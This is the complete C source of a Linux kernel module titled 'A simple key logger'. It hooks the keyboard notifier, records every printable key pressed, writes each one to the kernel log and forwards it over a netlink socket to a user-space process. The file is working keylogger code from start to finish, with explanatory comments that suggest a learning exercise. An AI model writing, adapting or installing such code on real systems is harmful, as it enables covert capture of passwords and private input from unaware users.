#include <net/sock.h> //netlink functions
#include <linux/netlink.h> //netlink socket
#include <linux/skbuff.h> //skbuff struct
#include <linux/keyboard.h> //create keyboard interrupt
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ron Shtar");
MODULE_DESCRIPTION("A simple key logger");
MODULE_VERSION("0.01");

#define PORT 30  //such as port between two processes kernel and user
char tav;
struct sock *nl_sk = NULL;
int pid; 
int keystroke_send(struct notifier_block *block, unsigned long code, void *p) //all those interrupts use this function format,code is type of interrupt
{
    struct nlmsghdr *nlhead;
    struct sk_buff *skb_out;
    int res;
    struct keyboard_notifier_param *param=(struct keyboard_notifier_param*) p;
    tav=param->value;
    if((int)code == KBD_KEYSYM && param->down == 1 && tav> 0x20 && tav < 0x7f) //KBD_KEYSYM => value is keysym,param down means it clicked (not released), take printable tav accroding to ascii table
    {
        printk(KERN_INFO "%c WAS PRESSED\n",tav);
        skb_out = nlmsg_new(1, 0);    //allocate a new netlink message in skb_out that would be send to process
        if(!skb_out)
        {
            printk(KERN_ERR "Failed to allocate new skb\n");
            return 0;
        }
        nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, 1, 0);   //create netlink sturct msg header and connect it to skb_out=>netlink message,pid(kernel pid is 0),sequence number of message,type of message NLMSG_DONE (end of message),msg size,flags
        NETLINK_CB(skb_out).dst_group = 0;   //edit skb_out and define one client to receive this message
        strncpy(nlmsg_data(nlhead), &tav, 1); //copy data to nlmsg_data
        res = nlmsg_unicast(nl_sk, skb_out, pid); //send data with nl_sk socket to proccess (by pid)
        if(res < 0)
            printk(KERN_INFO "Error while sending back to user\n");

    }
    return 1;
}
static struct notifier_block keylogger = {  //struct that holds keystroke_send function which is called by keyboard interrupt
        .notifier_call = keystroke_send
        };
static void recv_msg(struct sk_buff *skb) //all those interrupts use this function format sk_buff is a struct that has information like packet
{
    struct nlmsghdr *nlhead;
    printk(KERN_INFO "Entering to keylogger\n"); 
    nlhead = (struct nlmsghdr*)skb->data;    //nlhead message comes from skb's data make it netlink data struct
    printk(KERN_INFO "received: %s\n",(char*)nlmsg_data(nlhead)); 
    pid = nlhead->nlmsg_pid;  //save the process id in order to send back
}

static int __init keylogger_init(void)
{
    struct netlink_kernel_cfg netlinkS = {  //struct that holds recv_msg function which is called by recv meassage interrupt from proccess
        .input = recv_msg,
    };
     
    register_keyboard_notifier(&keylogger); //add struct that holds function, when keyboard interuppt appears it will go to keylogger struct
    nl_sk = netlink_kernel_create(&init_net, PORT, &netlinkS); //create netlink socket,port and connect it to struct that holds recv_msg function 
    if(!nl_sk)
    {
        printk(KERN_ALERT "Error creating socket.\n");
        return -1;
    }
    printk("Keylogger Init\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    printk(KERN_INFO "exiting myNetLink module\n");
    netlink_kernel_release(nl_sk); //close netlink socket
    unregister_keyboard_notifier(&keylogger); //remove keyboard identifier interrupts
}

module_init(keylogger_init); //call init function that initialize keyboard and net link interrupts
module_exit(keylogger_exit);  //call exit that release keyboard and net link interrupts 
